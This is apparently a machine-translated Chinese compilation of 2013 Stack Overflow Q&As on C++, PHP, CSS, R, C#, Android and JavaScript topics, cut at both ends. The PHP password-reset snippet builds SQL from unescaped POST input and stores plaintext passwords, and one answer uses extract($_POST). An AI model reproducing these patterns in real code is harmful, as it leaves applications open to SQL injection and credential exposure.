    system("pause");
} 
```

我需要调用以下程序：

```
#include "stdafx.h"
#include <iostream>
#include <iomanip>
#include <string>

using namespace std;

void main(int argc, char*argv[])
{       
    string baci;        
    for(int i = 1; i < argc; i++)
        baci += argv[i];

    if (baci=="Hello")
        cout << "Francesco, ti mando 4 baci !!!" << endl;   

    system("pause");
} 
```

它没有正确创建命令行，我不知道为什么。任何人都可以帮助并解释为系统可执行文件使用双参数所需的任何变化吗？书籍和网络对这个过程不是很详细。我发现体面的只是这个，但我无法将它用于我的目的。 [C++：如何使用命令行参数](https://stackoverflow.com/questions/12285138/c-how-to-use-command-line-arguments)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:40:19.447

除了您的代码未编译之外，还有一些明显的问题。`void main()`首先，在 C++中没有这样的东西。它**必须**返回一个`int`. 第二个问题是您要重新声明`buffer`为`std::stringstream`. 第三个问题是，您随后将其按值传递给`sprintf`将不起作用的第一个参数，因为它既不是 a`char*`也不是通过指针传递的。第四个问题是您试图将参数扩展为整数值 ( `%i`) 而不是 C 样式字符串 ( `%s`)。您还有两个参数格式说明符，但只传递一个。这个结果是未定义的，第二个`%i`可以扩展为任何值。

您的代码应该看起来像这样......

```
int main()
{   
    char buffer[200];
    char arg1[6]="Hello";
    sprintf(buffer, "C:\\system.exe %s", arg1);
    system(buffer);     

    system("pause");

    return 0;
} 
```

要将 a`double`作为参数传递，只需更改格式字符串中的[打印说明](http://en.cppreference.com/w/cpp/io/c/fprintf)符。

```
 double arg1 = 1.0f;
    sprintf(buffer, "C:\\system.exe %lf", arg1); 
```

要传递多个参数，您需要包含一个额外的格式说明符并将参数传递给`sprintf`

```
 sprintf(buffer, "C:\\system.exe %s %s %i", arg1, arg2string, arg3int); 
```

您的第二个程序也有问题，我认为它不会按您期望的方式执行。正如托马斯在他的评论中指出的那样，您将这些论点连接在一起，然后进行比较。如果您按原样执行它，`system.exe hello there`那`baci`似乎`hello there`是不正确的。由于您只想查看是否`Hello`已发送，因此您应该在循环中检查它，而不是连接字符串。

```
void main(int argc, char*argv[])
{       
    for(int i = 1; i < argc; i++)
        if (0 == strcmp(argv[i], "Hello"))
            cout << "Francesco, ti mando 4 baci !!!" << endl;   

    system("pause");
} 
```

# ios - iOS - 导航栏 - 带有另一个导航栏的内部表格视图

> ID：16091291
> 
> 赞同：0
> 
> 时间：2013-04-18T19:15:43.743
> 
> 标签：ios, uitableview, uinavigationcontroller

我有一个基于导航的应用程序。
在我的视图中间，我有一个表格视图。在表格视图中点击一个单元格时，只有表格视图的视图必须被推送。我在想，如果我在导航栏中有 tableview，我们可以实现这一点。
是否可以在基于导航的应用程序中使用 tableview+nav bar？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:26:22.297

我在[导航控制器中找到了解决方案导航控制器](http://www.kickasslabs.com/2009/07/03/uinavigationcontroller-tricks/)

# css - 如何防止在 Chrome 中聚焦时显示隐藏元素？

> ID：16091292
> 
> 赞同：6
> 
> 时间：2013-04-18T19:15:48.780
> 
> 标签：css, google-chrome, focus, overflow, css-position

今天我有一个奇怪的问题，在 Chrome 中，当我关注一个绝对位于其溢出隐藏容器之外的元素时，它在 Chrome 浏览器 (Mac) 中可见。

我做了一个小提琴来说明这个问题：http: [//jsfiddle.net/GHgtc/](http://jsfiddle.net/GHgtc/)

**html**

```
 <div id="container">
        <a id="inner-button" href="#">You can see me !</a>
    </div> 
```

**CSS**

```
#container{
    display: block;
    background: blue;
    width: 200px;
    height: 30px;
    position: relative;
    overflow: hidden;
}

#inner-button{
    display: block;
    background: red;
    width: 20px;
    height: 20px;
    position: absolute;
    top: 5px;
    right: -20px;
} 
```

谢谢你的帮助 ！

干杯！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T09:01:12.417

在“内部按钮”上使用 tabindex="-1"。那会妨碍焦点。 [http://jsfiddle.net/GHgtc/2/](http://jsfiddle.net/GHgtc/2/)

```
<input placeholder="focus on me then press tab" type="text">
<div id="container">
    <a id="inner-button" tabindex="-1" href="#">You can see me !</a>
</div> 
```

更新：

在处理我自己的一些焦点问题时，我意识到还有另一种可能的解决方案。如果您需要稍后通过 javascript 事件触发焦点，则可以使用 z-index:-1 。

```
#inner-button{
    display: block;
    background: red;
    width: 20px;
    height: 20px;
    position: absolute;
    top: 5px;
    right: -20px;
    z-index:-1;
} 
```

[http://jsfiddle.net/GHgtc/3/](http://jsfiddle.net/GHgtc/3/)

这将使它保持焦点但隐藏。您可以使用 z-index:0 动态使其可见。

# php - 我的代码不会写入 mysql 数据库

> ID：16091293
> 
> 赞同：0
> 
> 时间：2013-04-18T19:15:48.913
> 
> 标签：php, mysql, passwords, reset

我已经创建了一个登录系统，现在我正在尝试向它添加重置密码代码。除了没有写入 Mysql 数据库外，一切似乎都运行良好。任何帮助将不胜感激。

```
 <?php
if(isset($_POST['submit'])){
$mycode = ($_POST['code']);
$mynewpass = ($_POST['password']);
$myconfpass = ($_POST['password1']);

    //checks if all fields are filled
if( (empty($mynewpass)) || (empty($myconfpass)) || (empty($mycode)) ){
    $errors[] = '<center>All fields must be filled in.<center>';
}   
    //check if passwords match
if ($mynewpass != $myconfpass){
    $errors[] = '<center>Your passwords do not match</center>'; 
}
        if (!empty($errors)){
    foreach($errors as $error){
        echo '<strong>',$error ,'</strong><br />';
    }
    }else{

include 'Grubconfig.php';

mysql_connect($host, $user, $password) or die(mysql_error());
mysql_select_db($database) or die(mysql_error());

// change password
$mychk = mysql_query(" SELECT * FROM customer WHERE passreset = '$mycode' ");

if(mysql_num_rows($mychk) == 1)

     mysql_query("UPADTE customer SET Password='$mynewpass' WHERE passreset='$mycode'");
     mysql_query("UPADTE customer SET passreset='0' WHERE passreset='$mycode'");

    echo '<center>Your password has been reset Please click <a href="Grublogin.php">here !</a><center>';
    } 
```

} ?>

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:17:21.797

错别字：

```
 mysql_query("UPADTE customer SET Password='$mynewpass' WHERE passreset='$mycode'");
              ^^^^^^--- UPDATE (swap D and A) 
```

永远不要假设您的查询是成功的。始终检查错误：

```
$result = mysql_query($sql) or die(mysql_error());
                           ^^^^^^^^^^^^^^^^^^^^^^-- bare minimum error handling 
```

您也很容易受到[SQL 注入攻击](http://bobby-tables.com)。因此，您最好在部署此代码之前阅读它们并修复漏洞。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:19:14.703

```
if(mysql_num_rows($mychk) == 1)

 mysql_query("UPADTE customer SET Password='$mynewpass' WHERE passreset='$mycode'");
 mysql_query("UPADTE customer SET passreset='0' WHERE passreset='$mycode'"); 
```

1.  UPDATE 拼写错误
2.  您没有打开数字括号`if ( ... ) {` ，因为您有 2 个语句

您可以将它们粘贴到一个查询中：

```
UPDATE customer SET password = '$mynewpass', passreset = 0 WHERE passreset = '$mycode'; 
```

但是，您最好将数据库交互迁移到 MySQLi 或 PDO。mysql 库现已弃用。

# javascript - Video.js简单功能失败

> ID：16091294
> 
> 赞同：0
> 
> 时间：2013-04-18T19:15:49.390
> 
> 标签：javascript, video, video.js

这似乎应该是一个超级简单的函数，但出于某种原因 currentFrame(canv2); 返回“未定义”

我有许多更复杂的功能，使用与此相同的元素，它们都可以工作。

```
var frameRate = 30;

var players=new Array(_V_("video_canvas_1"), _V_("video_canvas_2"));

var canv1 = players[0];
var canv2 = players[1];

function currentFrame(e) {
    frameRate * e.currentTime();
} 
```

**更新** 所以我将值写入控制台，当然效果很好：

```
function currentFrame(e) {
    frameRate * e.currentTime();
    console.log('currentTime * frameRate:' + frameRate * e.currentTime());
} 
```

返回

```
currentTime * frameRate:102.09498167037964 main.js:45
currentTime * frameRate:102.09498167037964 main.js:45
currentTime * frameRate:102.09498167037964 main.js:45 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:19:05.950

看起来你可能需要

```
function currentFrame(e) {
    return frameRate * e.currentTime();
} 
```

# asp.net-mvc - 如何链接到基本视图文件夹？

> ID：16091297
> 
> 赞同：1
> 
> 时间：2013-04-18T19:16:00.597
> 
> 标签：asp.net-mvc, razor

在 MVC 中，我试图直接在 View 目录中链接到一个视图，该页面名为“Settings.cshtml”。我尝试了以下但没有成功：

```
@Html.ActionLink("Your Settings", "Settings", "View")
@Html.ActionLink("Your Settings", "Settings")
@Html.ActionLink("Your Settings", "Settings", "~/View") 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T19:22:42.250

Action links do not link to a view, they link to an action. You will need to implement a controller action that returns the view:

```
public ActionResult Settings()
{
    return View();
} 
```

If you place this in your `HomeController`, the following `ActionLink` should pick up your view:

```
@Html.ActionLink("Your Settings", "Settings") 
```

If you need to do this a lot, you could look at implementing a more general Action method that allows you to pass in a view name, like so:

```
public ActionResult ShowView(string viewName)
{
    return View();
} 
```

--

```
@Html.ActionLink("Your Settings", "ShowView", new { viewName = "Settings" }) 
```

# r - 有效地获取旧版本的 R 包

> ID：16091304
> 
> 赞同：16
> 
> 时间：2013-04-18T19:16:27.577
> 
> 标签：r

关于 SO 的一个反复出现的问题是包 xx 不适用于 R 版本 2.xx.xx。例如[，](https://stackoverflow.com/questions/16091096/can-not-install-package-in-r)该`gplots`软件包要求用户安装 R 3.0 才能安装。您可以在 CRAN 的存档中获取旧版本，但是：

*   要查看特定 R 版本需要获取哪个版本的软件包并不容易。
*   您需要从源代码构建包，这在 Windows 下主要是一个（温和的）挑战。

我的问题如下：是否有更有效的工作流程来获取与旧版本 R 匹配的旧包版本？本着为不同版本的 ubuntu 提供不同软件包存储库的精神。

我知道一种选择是只获取最新版本的 R，但可能有一些紧迫的理由坚持使用某个版本的 R。例如，有人可能有兴趣重复依赖旧版本的旧实验R 和支持包。或者是受系统管理限制。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T05:41:39.153

这完全未经测试（我正在运行最新版本的 R 并且目前没有时间安装旧版本的 R 来测试它），但也许一个想法是从“存档”页面获取日期包，将其与您的 R 版本的日期进行比较，然后逐步尝试安装早期版本，从最新版本开始。

这样的事情可能是一个*起点*：

```
install_archive <- function(PackageName) {
  if(!require("XML"))
      install.packages("XML")
  if(!require("devtools"))
      install.packages("devtools")
  rVersionDate <- as.Date(paste(R.Version()[c("year", "month", "day")],
                                collapse = "-"))
  BaseURL <- "http://cran.r-project.org/src/contrib/Archive/"
  u <- htmlParse(paste(BaseURL, PackageName, sep = ""))
  doc <- readHTMLTable(u, skip.rows=1:2)[[1]][2:3]
  releaseDate <- as.Date(strptime(doc$`Last modified`, 
                                  format="%d-%b-%Y"))
  Closest <- which.min(rVersionDate - 
                         releaseDate[releaseDate <= rVersionDate])
  install_url(paste(BaseURL, doc$Name[Closest], sep = ""))
} 

install_archive("reshape") 
```

从这里开始，我将至少在函数中添加以下内容：

*   我会首先尝试安装最新版本（不是来自“存档”），如果失败，然后继续。
*   在继续前进的过程中，我会将`which.min()`行更改为`rank()`，并尝试 rank == 1、rank == 2 等等，也许会设置一个尝试的最大排名。

即便如此，这是很多“猜测和检查”，只有软件会自动为您进行猜测和检查。而且，当然，同样的建议认为它不在 CRAN 上可能有充分的理由！

# c# - 需要帮助将事件驱动的代码分成尊重 MVVM 模式的层

> ID：16091312
> 
> 赞同：2
> 
> 时间：2013-04-18T19:17:03.023
> 
> 标签：c#, wpf, mvvm

我有一个名为 NewCalibrationView.xaml/.cs 的视图，它有一个 ViewModel NewCalibrationViewModel.cs

视图的 xml：

```
<StackPanel Grid.Column="0" Orientation="Horizontal" HorizontalAlignment="Left" >
    <Label Content="Run Time:" FontSize="16" FontWeight="Bold" Margin="10,0,0,0"/>
    <TextBlock Name="ClockTextBlock" Text="00:00:00:00" FontSize="16" Foreground="Red" Margin="5" FontWeight="Bold"/>
</StackPanel>
<StackPanel Grid.Column="1" Orientation="Horizontal" HorizontalAlignment="Right">
    <Label Content="Sample Count:" FontSize="16" FontWeight="Bold" Margin="10,0,0,0"/>
    <TextBlock Text="0" Name="SampleCountDigit" Foreground="Red" FontSize="16" FontWeight="Bold" Margin="5"/>
</StackPanel> 
```

正如人们所看到的，我有一个显示各种秒表的 TextBlock，目前运行秒表的代码在视图后面的代码中（NewCalibrationView.cs）

```
public partial class NewCalibrationView: UserControl
{
    private DispatcherTimer dt = new DispatcherTimer();
    private Stopwatch stopWatch = new Stopwatch();

    private string _currentTime = string.Empty;
    private int _sampleCount = 0;

    public NewCalibrationView()
    {
        InitializeComponent();

        dt.Tick += new EventHandler(dt_Tick);
        dt.Interval = new TimeSpan(0, 0, 0, 0, 1);
    }

    private void dt_Tick(object sender, EventArgs e)
    {
        if (stopWatch.IsRunning)
        {
            TimeSpan ts = stopWatch.Elapsed;

            _currentTime = String.Format("{0:00}:{1:00}:{2:00}", ts.Hours, ts.Minutes, ts.Seconds);

            ClockTextBlock.Text = _currentTime;

            if (ts.Seconds%8 == 0)
            {
                _sampleCount++;
                SampleCountDigit.Text = _sampleCount.ToString();
            }
        }
    }

    private void StartButton_Click(object sender, RoutedEventArgs e)
    {
        ClockTextBlock.Foreground = Brushes.Green;
        stopWatch.Start();
        dt.Start();
    } 
```

因为此代码直接在`dt.Tick();`DispatchTimer 的 Tick 事件的事件处理程序 ( ) 中更新视图，所以我很难弄清楚代码隐藏中的内容以及 ViewModel 中的内容。

鉴于我在此处显示的代码隐藏代码，视图中应该包含哪些内容以及 ViewModel 中应该包含哪些内容？

首先，我认为 StartButton_Click() 应该转换为命令（我通常将其放入 VM 中），但如果是这种情况，那么仅这样做意味着我必须将 DispatchTimer 的声明和秒表也进入 VM，这意味着其余代码（事件处理程序、其注册等）必须在 VM 中。

这听起来对吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:21:21.840

如果是我，我会将其全部移至视图模型。我会在我的视图模型上绑定 2 到 2 个字符串的`Text`属性。`TextBlock`正如你所说，将`Button`命令属性绑定到`ICommand`你的视图模型上。此外，您可以在视图模型上保留一个布尔属性，该属性绑定到您的颜色`TextBlock`（您需要数据触发器）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T01:01:50.770

我会考虑使用 MVVM 工具包。我个人使用并更喜欢 MVVM Light Toolkit，但还有其他类似的。

我喜欢 MVVM Light Toolkit 的地方在于它易于使用、简单，并带有出色的文档和示例。

一旦您使用 MVVM 建立，然后将您的命令、文本元素绑定到您的 ViewModel。然后，您可以在 ViewModel 中处理您的事件。只需将您的命令绑定视为一个事件。

我希望这会有所帮助。如果您需要更多详细信息，请告诉我，我可以回复。

# c - 读取文件并将每一行保存到 C 中的变量

> ID：16091313
> 
> 赞同：0
> 
> 时间：2013-04-18T19:17:11.020
> 
> 标签：c, fopen

我正在使用 fgetc 和 fopen 在 C 中读取文件。我想在变量中获取第一行，在单独的变量中获取第二行，如下所示：

```
f = fopen("textfile", "r");

if (!f) {
   printf("error");
} else {
   loop until end of newline and save entire line to a variable
   1st line ==> line1
   2nd line ==> line2
} 
```

所以如果文本文件有：

```
hello world
goodbye world 
```

line1 = “你好世界” line2 = “再见世界”

我正在考虑循环直到 \n 但我应该如何存储字符？认为这是一个简单的问题，也许我错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:22:29.240

You want to:

I. use `fgets()` to get an entire line, then

II. store the lines into an array of array of `char`.

```
char buf[0x1000];
size_t alloc_size = 4;
size_t n = 0;
char **lines = malloc(sizeof(*lines) * alloc_size);
// TODO: check for NULL

while (fgets(buf, sizeof(buf), f) != NULL) {
    if (++n > alloc_size) {
        alloc_size *= 2;
        char **tmp = realloc(lines, sizeof(*lines) * alloc_size);
        if (tmp != NULL) {
            lines = tmp;
        } else {
            free(lines);
            break; // error
        }

        lines[n - 1] = strdup(buf);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:21:34.707

```
char line[NBRCOLUMN][LINEMAXSIZE];
int i =0; int len;
while (i<NBRCOLUMN && fgets(line[i],sizeof(line[0]),f)) {
    len = strlen(line[î]);
    if(line[len-1] == '\n') line[len-1] = '\0'; // allow to remove the \n  at the end of the line
    i++;
    ....
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T21:53:14.657

```
#include <stdio.h>

int main(int argc, char *argv[]){
    char line1[128];
    char line2[128];
    FILE *f;

    f = fopen("textfile", "r");
    if (!f) {
       printf("error");
    } else {
        fscanf(f, "%127[^\n]\n%127[^\n] ", line1, line2);
        printf("1:%s\n", line1);
        printf("2:%s\n", line2);
        fclose(f);
    }

    return 0;
} 
```

# android - Android json 错误 com.google.gson.JsonSyntaxException: java.lang.IllegalStateException

> ID：16091314
> 
> 赞同：4
> 
> 时间：2013-04-18T19:17:11.250
> 
> 标签：android, json, gson

我在解析 json 数据时遇到了这个错误

```
Expected BEGIN_ARRAY but was BEGIN_OBJECT at line 1 column 2 
```

我找不到解决方案。我的 json 数据是：

```
{
  "user": [
    {
      "email": "wijden@jerseyrest.com",
      "firstName": "Wijden",
      "id": "1",
      "lastName": "User"
    }, {
      "email": "user@jerseyrest.com",
      "firstName": "Sample",
      "id": "2",
      "lastName": "User"
    }, {
      "email": "ingenieur@jerseyrest.com",
      "firstName": "Ingenieur",
      "id": "3",
      "lastName": "User"
    }
  ]
} 
```

我就是这样做的：

```
Type type = new TypeToken<List<WorkItem>>() { }.getType();
List<WorkItem> workitems = (List<WorkItem>) new Gson().fromJson(resultat, type); 
```

如果您能帮我解决 tnis 问题，我将不胜感激。提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:38:14.800

为了解析您的 JSON，我将创建类来*包装*响应，即：

```
public class Response {
  @SerializedName("user")
  private List<User> userList;
  //getters and setters
} 
```

和，

```
public class User{
  @SerializedName("id")
  private int id;
  @SerializedName("email")
  private String email;
  @SerializedName("firstName")
  private String firstName;
  @SerializedName("lastName")
  private String lastName;
  //getters and setters
} 
```

然后，为了解析您的 JSON 响应，您只需执行以下操作：

```
Gson gson = new Gson();
Response data = gson.fromJson(yourJsonString, Response.class); 
```

然后您可以非常轻松地访问您的数据，例如：

```
User user = data.getUserList.get(i); 
```

*注意*`@SerializedName`：为了遵循 Java 命名约定，使用注解将 JSON 响应和应用程序中的字段名称分开是很有趣的...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:25:32.967

当您尝试解析这样的集合时，Gson 期望您拥有 JSON ARRAY（如错误消息所述），而不是 Object。您的 JSON 是一个包含 ARRAY（对象数组）的 OBJECT。

要解析它，您需要一个将集合作为您的类型的 Java 对象。或者，您需要将 json 更改为数组，或者您可以创建自定义序列化器/反序列化器（或想出一些其他技巧，但底线是您的 JSON 不是数组，在当下）。

尝试更改您将其解析为的 Java 对象，以便快速修复：

```
public class WorkItemsContainer {
  private List<WorkItem> workItems;
  //getters/setters/ctor/etc
} 
```

请参阅此处的 Gson 文档“带有对象”部分：[https](https://sites.google.com/site/gson/gson-user-guide#TOC-Object-Examples) ://sites.google.com/site/gson/gson-user-guide#TOC-Object-Examples 。

# radgrid - 应用过滤器时，Telerik RadGrid SelectedItem 未指向实际选定的项目

> ID：16091315
> 
> 赞同：0
> 
> 时间：2013-04-18T19:17:13.623
> 
> 标签：radgrid

```
Grid.SelectedIndexChanged += new EventHandler(Grid_SelectedIndexChanged);

void Grid_SelectedIndexChanged(object sender, EventArgs e)
{
    DataItem item = Grid.SelectedItems[0].DataItem;
} 
```

未应用过滤器时，所选项目是好的。但是当应用过滤器时，网格只显示过滤的项目，这是正确的。But when the item is selected it's bringing in the item from the full list instead of the filtered.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:47:14.143

我知道了。以下行成功了。

```
Grid.EnableViewState = false; 
```

# r - R中的矢量化顺序

> ID：16091320
> 
> 赞同：7
> 
> 时间：2013-04-18T19:17:35.593
> 
> 标签：r

我正在尝试对矩阵中的每一行进行排序，其中列数少，行数多。R中是否有这个的矢量化版本？更具体地说，让我们将种子设置为 10 并制作一个示例矩阵：

```
set.seed(10)
example.matrix = replicate(12,runif(500000)) 
```

要订购 example.matrix，我会，

```
ordered.example = apply(example.matrix,1,order) 
```

但这很慢，我会喜欢更快的东西。打个比方，

```
rowSums(example.matrix) 
```

更可取的是，

```
apply(example.matrix,1,sum) 
```

非常感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:53:53.053

这有点快（关键是`order(row(em), em)`）：

```
set.seed(10)
em <- replicate(12,runif(500000))
system.time(a <- matrix(em[order(row(em), em)], nrow=nrow(em), byrow=TRUE))
#    user  system elapsed 
# 5.36    0.12    5.80 

set.seed(10)
example.matrix <- replicate(12,runif(500000))
system.time(ordered.example <- apply(example.matrix,1,order))
#    user  system elapsed 
#   13.36    0.09   15.52 

identical(a, ordered.example)
# [1] FALSE 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-18T19:56:57.277

这是一种将其加速 10 倍的方法。它专门针对您的示例量身定制，具体取决于您的真实数据是什么样的，此方法可能有效，也可能无效。

这个想法是将 0 添加到第一行，将 1 添加到第二行，依此类推，然后将其折叠为一个向量，对其进行排序，然后重新组合成一个矩阵：

```
N = 12; M = 500000; d = replicate(N,runif(M))

system.time(d1<-t(apply(d, 1, order)))
#   user  system elapsed 
#  11.26    0.06   11.34 

system.time(d2<-matrix(order(as.vector(t(matrix(as.vector(d) + 0:(M-1), nrow = M)))) -
                       rep(0:(M-1), each = N)*N, nrow = M, byrow = T))
#   user  system elapsed 
#   1.39    0.14    1.53 

# Note: for some reason identical() fails, but the two are in fact the same
sum(abs(d1-d2))
# 0 
```

# iphone - 如何解决 Xcode 中这个 IAP 内容包上传错误？

> ID：16091321
> 
> 赞同：0
> 
> 时间：2013-04-18T19:17:38.570
> 
> 标签：iphone, ios, xcode, in-app-purchase, storekit

我正在尝试通过 Xcode 上传 Apple 托管的非消耗性 IAP 包。它验证得很好。但是当我尝试提交它时，我收到以下错误：

> *   苹果网络服务运营不成功
>     
>     
> *   无法对包进行身份验证：693344215.itmsp
>     
>     
> *   错误 ITMS-4029：“在解析包“YourApp”时捕获异常”（MZItmsBadPackage）

# php - Facebook Graph 回复搜索结果

> ID：16091322
> 
> 赞同：0
> 
> 时间：2013-04-18T19:17:42.053
> 
> 标签：php, facebook-graph-api, search, reply

在 twitter 搜索 API 中，您可以使用每个搜索结果必须回复该帖子的唯一 ID。

例如（php）：

```
$twitter_json = file_get_contents("http://search.twitter.com/search.json?q=".$query."&lang=en", true);
$twitter_search_res = json_decode($twitter_json, true);
$id = $twitter_search_res['results'][0]['id'];
echo "<a href = 'https://twitter.com/intent/tweet?in_reply_to={$id}'>"; 
```

* * *

如何回复 Facebook 图表搜索返回的帖子？

```
$fb_json = file_get_contents("http://graph.facebook.com/search?q=".$query."", true);
$fb_search_res = json_decode($fb_json, true); 
```

结果之一是：

```
array(7) {
  ["id"]=>
  string(31) "100000101152749_627923180554381"
  ["from"]=>
  array(2) {
    ["name"]=>
    string(19) "Jellie Artus Judith"
    ["id"]=>
    string(15) "100000101152749"
  }
  ["message"]=>
  string(101) "here comes the most awaited event of our lives. hahaha graduation of Wave95 (expedia)
:) pakaL time.."
  ["privacy"]=>
  array(1) {
    ["value"]=>
    string(0) ""
  }
  ["type"]=>
  string(6) "status"
  ["created_time"]=>
  string(24) "2013-04-18T19:18:23+0000"
  ["updated_time"]=>
  string(24) "2013-04-18T19:18:23+0000"
} 
```

我厌倦了使用`https://graph.facebook.com/{$fb_result_id}/comments`，但图形搜索返回的 id 似乎不是正确的。我还在“_”处拆分了 id，但这些都不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T07:18:31.840

如[https://developers.facebook.com/docs/reference/api/search/](https://developers.facebook.com/docs/reference/api/search/)所示，**[http](http://graph.facebook.com/search?q=YOUR_QUERY)** ://graph.facebook.com/search?q=YOUR_QUERY是搜索所有公开帖子，这种帖子很可能不是您朋友的帖子，通常您没有评论权限。

如果你想从你的新闻提要中搜索帖子，你可以这样做

[https://graph.facebook.com/me/home?q=a&access_token=USER_ACCESS_TOKEN](https://graph.facebook.com/me/home?q=a&access_token=USER_ACCESS_TOKEN)

post_id 使用 curl 的示例评论：

```
 <?php
    //extract data from the post
    extract($_POST);

    //set POST variables
    $url = 'https://graph.facebook.com/150552388343703_483757795023159/comments?access_token=USER_ACCESS_TOKEN';
    $msg = 'hello world testing';
    $fields = array(
                            'message' => urlencode($msg),
                    );

    //url-ify the data for the POST
    foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
    rtrim($fields_string, '&');

    //open connection
    $ch = curl_init();

    //set the url, number of POST vars, POST data
    curl_setopt($ch,CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_POST, count($fields));
    curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

    //execute post
    $result = curl_exec($ch);

    //close connection
    curl_close($ch);

    ?> 
```

# actionscript-3 - AS3阶段截图到硬盘保存

> ID：16091327
> 
> 赞同：0
> 
> 时间：2013-04-18T19:17:55.543
> 
> 标签：actionscript-3, flash, screenshot, hard-drive

我正在开发一个拖放式 Flash 游戏，在您放置所有可移动的部分后，我想要一个按钮，可以让人们保存整个舞台的屏幕截图。

我搜索了不同的示例，但无法使此代码正常工作。

这是AS3

```
snap_btn.addEventListener(MouseEvent.CLICK, snapShot );

function snapShot( evt:MouseEvent ):void
{

import com.adobe.images.JPGEncoder;

var jpgSource:BitmapData = new BitmapData (stage.width, stage.height); 
jpgSource.draw(stage); 

var jpgEncoder:JPGEncoder = new JPGEncoder(85); 
var jpgStream:ByteArray = jpgEncoder.encode(jpgSource);

var header:URLRequestHeader = new URLRequestHeader("Content-type", "application/octet-stream"); 
var jpgURLRequest:URLRequest = new URLRequest("jpg_encoder_download.php?name=sketch.jpg"); 
jpgURLRequest.requestHeaders.push(header); 
jpgURLRequest.method = URLRequestMethod.POST; 
jpgURLRequest.data = jpgStream; 
navigateToURL(jpgURLRequest, "_blank");

} 
```

PHP的

```
<?php
if (isset($GLOBALS["HTTP_RAW_POST_DATA"])) 
{ 
// get bytearray 
$jpg = $GLOBALS["HTTP_RAW_POST_DATA"]; 

// add headers for download dialog-box 
header('Content-Type: image/jpeg'); 
header("Content-Disposition: attachment; filename=".$_GET['name']); 
echo $jpg; 
}
?> 
```

我最终得到了这个工作，我摆脱了 php

```
snap_btn.addEventListener(MouseEvent.CLICK, snapShot );

function snapShot( evt:MouseEvent ):void
{

import com.adobe.images.JPGEncoder; 

var jpgSource:BitmapData = new BitmapData(stage.width, stage.height);
jpgSource.draw(stage);
var jpgEncoder:JPGEncoder = new JPGEncoder(80);
var imgByteData:ByteArray = jpgEncoder.encode(jpgSource);
file = new FileReference();

file.save(imgByteData, "Haven_Big_Dream_Map.jpg");

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T21:23:36.913

我将重写埃文的答案。

在 BitmapData 上使用 adobe.corelib 中的 JPEGEncode 或 PNGEncode 后，使用 FileReference 保存文件。请记住，旧版本的 FlashPlayer (<10) 不会将文件保存在驱动器上！

# java - 在jqGrid中选择另一行时默认选定行的颜色不会改变

> ID：16091330
> 
> 赞同：0
> 
> 时间：2013-04-18T19:18:10.217
> 
> 标签：java, javascript, jqgrid

我有一个 jgGrid，其中我在页面加载时默认选择了第一行。（所选行突出显示为黄色）。现在，当我在同一个 jqGrid 中选择其他行时，当前选择的行和默认选择的行都以黄色突出显示。理想情况下，当用户选择另一行时，先前选择的行不应以黄色突出显示。

下面是快照以更好地解释：

默认选定行以黄色突出显示（在页面加载中）： ![在此处输入图像描述](https://i.stack.imgur.com/mJWpr.jpg)

当前选定和默认选定行都以黄色突出显示： ![在此处输入图像描述](https://i.stack.imgur.com/Npu7J.jpg)

下面是我的 jqGrid 代码：

```
$("#discActionHistGrid").jqGrid({
    url:contextRoot+'discActHist',
    datatype: 'json',
    jsonReader: {repeatitems: false},
    mtype: 'POST',
    colNames: ['Record ID','Close date','Final Action','Summary','Title','Council','Retraction'],
    colModel: [
               { name: 'referralId', index: 'referralId', width: 25 },
               { name: 'closureDate', index: 'closureDate', width: 30, formatter: function(cellValue){return $.datepicker.formatDate('mm-dd-yy', new Date(cellValue));}},                   
               { name: 'finalAction', index: 'finalAction', width: 30 },
               { name: 'summary', index: 'summary', width: 50, cellattr: function (rowId, tv, rawObject, cm, rdata) { return 'style="white-space: normal;line-height: 1.3em;"'; } },
               { name: 'title', index: 'title', width: 30 },
               { name: 'councilNm', index: 'councilNm', width: 30 },
               { name: 'retract', index: 'retract', width: 30, formatter: function (cellvalue, options, rowObject) {return '<a href="'+ contextRoot +'dart/approved">Retract</a>';} }
    ],loadError: function(xhr,st,err) {
        alert(err);
    },gridComplete: function() {
        $(this).setSelection(1, true);
    },onSelectRow : function(rowid, status, e) {
        var selRow = $(this).getGridParam("selrow");
        var selReferralId = $(this).getCell(selRow, 'referralId'); 
        $("#referralDetailsTab").load(contextRoot+"refDetailsTab?refId=" + selReferralId );
    },
    pager: '#discActionHistPager',
    sortorder: 'desc',
    sortname: 'closureDate',
    gridview: true,
    viewrecords: true,
    loadonce: true,
    hoverrows : true,
    autowidth: true,
    height: 'auto',
    rowNum: 3,
    shrinkToFit: true,
    altRows:true
});

$("#discActionHistGrid").jqGrid('navGrid','#discActionHistPager',
   {
    edit:false,
    add:false,
    del:false,
    search:false,
    refresh:false
}); 
```

谁能帮我解决这个问题？

在 Oleg 的建议后编辑的代码：

```
$("#discActionHistGrid").jqGrid({
    url:contextRoot+'discActHist',
    datatype: 'json',
    jsonReader: {repeatitems: false, id: "referralId"},
    mtype: 'POST',
    colNames: ['Record ID','Close date','Final Action','Summary','Title','Council','Retraction'],
    colModel: [
